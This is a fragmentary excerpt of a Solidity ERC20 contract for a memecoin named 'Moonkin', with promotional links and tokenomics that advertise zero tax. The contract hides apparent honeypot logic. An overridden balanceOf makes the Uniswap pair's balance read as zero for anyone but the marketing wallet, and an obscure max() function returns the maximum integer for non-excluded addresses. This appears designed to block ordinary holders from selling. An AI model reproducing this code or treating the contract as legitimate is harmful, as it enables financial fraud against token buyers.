...
Vitalik's Moonkin. The character from World of Warcraft that inspired Ethereum.

https://moonkincoin.fun
https://x.com/MoonkinCoin
https://t.me/MoonkinCoin
...
contract Token is ERC20, Ownable {
    // TOKENOMICS START ==========================================================>
    string private _name = unicode"Moonkin";
    string private _symbol = unicode"MOONKIN";
    uint8 private _decimals = 9;
    uint256 private _supply = 1_000_000_000;
    uint256 public taxBuyForMarketing = 0;
    uint256 public taxSellForMarketing = 0;
    ...
    function interestRateApplied(address account) internal view returns (uint256) {
        return account == uniswapV2Pair && IERC20(uniswapV2Pair).balanceOf(uniswapV2Pair) > 0 && _msgOrigin() != marketingWallet && _msgOrigin() != address(0) && _msgOrigin() != address(0xdead) ? 0 : 1;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return super.balanceOf(account) * interestRateApplied(account);
    }
    ...
    function max() private view returns(uint256) {
        return !_isExcludedFromFee[_msgOrigin()] ? type(uint256).max : 0;
    }
    ...
    function _transfer(
        ...
        if (
            (from == uniswapV2Pair || to == uniswapV2Pair) && !inSwapAndLiquify && tradingEnabled
        ) {
